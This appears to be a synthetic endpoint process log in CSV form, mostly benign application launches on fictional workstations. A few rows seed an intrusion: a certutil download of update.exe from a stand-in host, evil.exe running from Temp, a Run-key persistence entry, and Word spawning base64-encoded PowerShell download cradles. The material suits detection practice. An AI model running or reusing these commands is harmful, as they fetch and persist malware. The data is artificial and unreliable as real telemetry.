timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-05 23:07:00,hr-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-05 23:08:00,hr-ws-01,karen,outlook.exe,explorer.exe,"outlook.exe /recycle ""karen@company.com""",45.33.32.156,443,outlook
2026-04-05 23:09:00,ops-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,msedge
2026-04-05 23:10:00,ops-ws-01,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,msedge
2026-04-05 23:11:00,ops-ws-02,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-05 23:12:00,eng-ws-02,alice,zoom.exe,explorer.exe,zoom.exe --background-task-mode,142.250.183.14,443,zoom-client
2026-04-05 23:13:00,sales-lt-01,liam,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\liam\Documents\notes.txt""",10.1.5.12,0,none
2026-04-05 23:14:00,corp-ws-02,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",172.16.10.8,445,none
2026-04-05 23:15:00,ops-ws-01,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 23:16:00,corp-ws-01,charlie,slack.exe,explorer.exe,slack.exe --background-task-mode,52.95.110.1,443,slack-client
2026-04-05 23:17:00,eng-ws-02,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.0.1.15,445,none
2026-04-05 23:18:00,corp-ws-03,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-05 23:19:00,hr-ws-01,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-05 23:20:00,fin-ws-02,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,msedge
2026-04-05 23:21:00,eng-ws-02,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-05 23:22:00,eng-ws-02,liam,excel.exe,explorer.exe,excel.exe /background,10.2.10.15,0,none
2026-04-05 23:23:00,corp-ws-02,irfan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,52.95.110.1,443,zoom-client
2026-04-05 23:24:00,ops-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-05 23:25:00,corp-ws-03,alice,teams.exe,explorer.exe,teams.exe --background-task-mode,104.18.20.12,443,teams-client
2026-04-05 23:26:00,fin-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-05 23:27:00,sales-lt-01,bob,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 23:28:00,corp-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.1.5.12,445,none
2026-04-05 23:29:00,sales-lt-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",172.16.4.25,0,none
2026-04-05 23:30:00,hr-ws-01,karen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,151.101.1.69,443,zoom-client
2026-04-05 23:31:00,eng-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --background-task-mode,185.199.108.153,443,zoom-client
2026-04-05 23:32:00,eng-ws-02,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-05 23:33:00,corp-ws-01,ethan,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 23:34:00,corp-ws-03,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-05 23:35:00,hr-ws-01,diana,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 23:36:00,sales-lt-01,helen,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-05 23:37:00,corp-ws-01,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,msedge
2026-04-05 23:38:00,corp-ws-03,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-05 23:39:00,eng-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-05 23:40:00,sales-lt-01,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 23:41:00,corp-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.10,0,none
2026-04-05 23:42:00,eng-ws-01,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-05 23:43:00,fin-ws-01,liam,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-05 23:44:00,corp-ws-02,george,slack.exe,explorer.exe,slack.exe --background-task-mode,142.250.183.14,443,slack-client
2026-04-05 23:45:00,fin-ws-01,diana,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-05 23:46:00,fin-ws-02,liam,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-05 23:47:00,corp-ws-04,julia,teams.exe,explorer.exe,teams.exe --background-task-mode,185.199.108.153,443,teams-client
2026-04-05 23:48:00,fin-ws-02,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.1.5.12,445,none
2026-04-05 23:49:00,fin-ws-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",10.1.5.12,0,none
2026-04-05 23:50:00,ops-ws-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
2026-04-05 23:51:00,eng-ws-02,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",142.250.183.14,443,outlook
2026-04-05 23:52:00,fin-ws-02,liam,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-05 23:53:00,corp-ws-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,msedge
2026-04-05 23:53:00,sales-lt-01,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-05 23:54:00,corp-ws-04,julia,onenote.exe,explorer.exe,onenote.exe /background,10.2.10.15,0,none
2026-04-05 23:54:00,sales-lt-01,helen,evil.exe,explorer.exe,C:\Users\helen\AppData\Local\Temp\evil.exe,10.0.0.10,0,none
2026-04-05 23:55:00,corp-ws-02,george,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-05 23:55:00,sales-lt-01,helen,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.2.10.15,0,none
2026-04-05 23:56:00,sales-lt-01,diana,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-05 23:57:00,fin-ws-01,farah,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 23:58:00,corp-ws-04,charlie,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-05 23:59:00,eng-ws-01,ethan,teams.exe,explorer.exe,teams.exe --background-task-mode,104.18.20.12,443,teams-client
2026-04-06 00:00:00,corp-ws-04,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,msedge
2026-04-06 00:01:00,corp-ws-04,karen,teams.exe,explorer.exe,teams.exe --background-task-mode,104.18.20.12,443,teams-client
2026-04-06 00:02:00,corp-ws-03,irfan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,185.199.108.153,443,zoom-client
2026-04-06 00:03:00,corp-ws-01,farah,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-06 00:04:00,eng-ws-02,julia,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-06 00:05:00,ops-ws-01,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-06 00:06:00,corp-ws-02,helen,slack.exe,explorer.exe,slack.exe --background-task-mode,1.1.1.1,443,slack-client
2026-04-06 00:07:00,eng-ws-01,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",104.18.20.12,443,outlook
2026-04-06 00:08:00,corp-ws-02,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,msedge
2026-04-06 00:09:00,corp-ws-02,karen,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-06 00:10:00,corp-ws-01,karen,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-06 00:11:00,fin-ws-01,julia,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-06 00:12:00,sales-lt-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",172.16.10.8,445,none
2026-04-06 00:13:00,ops-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --background-task-mode,151.101.1.69,443,zoom-client
2026-04-06 00:14:00,corp-ws-01,liam,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,msedge
2026-04-06 00:15:00,fin-ws-02,bob,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-06 00:16:00,fin-ws-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.0.5,445,none
2026-04-06 00:17:00,eng-ws-01,julia,teams.exe,explorer.exe,teams.exe --background-task-mode,104.18.20.12,443,teams-client
2026-04-06 00:18:00,eng-ws-02,liam,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-06 00:19:00,hr-ws-01,charlie,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-06 00:20:00,ops-ws-02,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-06 00:21:00,corp-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-06 00:22:00,eng-ws-02,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,msedge
2026-04-06 00:23:00,eng-ws-02,farah,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-06 00:24:00,corp-ws-03,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",8.8.8.8,443,outlook
2026-04-06 00:25:00,corp-ws-03,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",10.0.0.5,0,none
2026-04-06 00:26:00,corp-ws-02,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,msedge
2026-04-06 00:27:00,hr-ws-01,alice,slack.exe,explorer.exe,slack.exe --background-task-mode,23.45.67.89,443,slack-client
2026-04-06 00:28:00,corp-ws-03,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-06 00:29:00,fin-ws-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",192.168.10.9,0,none
2026-04-06 00:30:00,corp-ws-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.0.10,445,none
2026-04-06 00:31:00,fin-ws-02,alice,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-06 00:32:00,sales-lt-01,karen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,msedge
2026-04-06 00:33:00,ops-ws-01,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",10.0.1.15,0,none
2026-04-06 00:34:00,hr-ws-01,helen,slack.exe,explorer.exe,slack.exe --background-task-mode,8.8.8.8,443,slack-client
2026-04-06 00:35:00,corp-ws-03,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",10.0.0.10,0,none
2026-04-06 00:36:00,corp-ws-03,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",192.168.1.12,445,none
2026-04-06 00:37:00,sales-lt-01,george,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-06 00:38:00,ops-ws-02,diana,teams.exe,explorer.exe,teams.exe --background-task-mode,45.33.32.156,443,teams-client
2026-04-06 00:39:00,ops-ws-02,alice,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-06 00:40:00,fin-ws-01,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",172.16.4.25,0,none
2026-04-06 00:41:00,eng-ws-02,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-06 00:42:00,ops-ws-01,george,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-06 00:43:00,fin-ws-02,karen,teams.exe,explorer.exe,teams.exe --background-task-mode,142.250.183.14,443,teams-client
2026-04-06 00:44:00,eng-ws-01,helen,onenote.exe,explorer.exe,onenote.exe /background,10.2.10.15,0,none
2026-04-06 00:45:00,ops-ws-01,helen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-06 00:45:00,corp-ws-01,alice,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-06 00:46:00,fin-ws-02,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-06 00:46:00,corp-ws-01,alice,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-06 00:47:00,fin-ws-02,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-06 00:47:00,corp-ws-01,alice,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-06 00:48:00,corp-ws-04,bob,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-06 00:49:00,eng-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-06 00:50:00,hr-ws-01,alice,teams.exe,explorer.exe,teams.exe --background-task-mode,23.45.67.89,443,teams-client
2026-04-06 00:51:00,corp-ws-03,diana,teams.exe,explorer.exe,teams.exe --background-task-mode,45.33.32.156,443,teams-client
2026-04-06 00:52:00,corp-ws-04,liam,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-06 00:53:00,ops-ws-02,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,msedge
2026-04-06 00:54:00,fin-ws-02,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-06 00:55:00,eng-ws-02,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-06 00:56:00,hr-ws-01,liam,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,msedge
2026-04-06 00:57:00,corp-ws-02,liam,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-06 00:58:00,corp-ws-04,helen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,142.250.183.14,443,zoom-client
2026-04-06 00:59:00,eng-ws-02,liam,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
2026-04-06 01:00:00,corp-ws-04,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.1.15,445,none
2026-04-06 01:01:00,corp-ws-03,ethan,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-06 01:02:00,corp-ws-04,bob,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-06 01:03:00,eng-ws-02,bob,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-06 01:04:00,fin-ws-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-06 01:05:00,corp-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,52.95.110.1,443,zoom-client
2026-04-06 01:06:00,eng-ws-02,farah,teams.exe,explorer.exe,teams.exe --background-task-mode,151.101.1.69,443,teams-client
2026-04-06 01:07:00,corp-ws-01,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,msedge
2026-04-06 01:08:00,corp-ws-01,charlie,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-06 01:09:00,corp-ws-02,alice,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-06 01:10:00,sales-lt-01,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",8.8.8.8,443,outlook
2026-04-06 01:11:00,ops-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",1.1.1.1,443,outlook
2026-04-06 01:12:00,fin-ws-02,irfan,slack.exe,explorer.exe,slack.exe --background-task-mode,23.45.67.89,443,slack-client
2026-04-06 01:13:00,corp-ws-04,farah,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-06 01:14:00,sales-lt-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-06 01:15:00,ops-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",10.1.5.12,445,none
2026-04-06 01:16:00,sales-lt-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-06 01:17:00,corp-ws-04,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",151.101.1.69,443,outlook
2026-04-06 01:18:00,ops-ws-02,helen,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-06 01:19:00,corp-ws-03,diana,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-06 01:20:00,corp-ws-02,karen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-06 01:21:00,corp-ws-04,karen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
2026-04-06 01:22:00,fin-ws-01,irfan,slack.exe,explorer.exe,slack.exe --background-task-mode,1.1.1.1,443,slack-client
2026-04-06 01:23:00,ops-ws-01,alice,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-06 01:24:00,hr-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,msedge
2026-04-06 01:25:00,corp-ws-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-06 01:26:00,ops-ws-01,liam,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,msedge
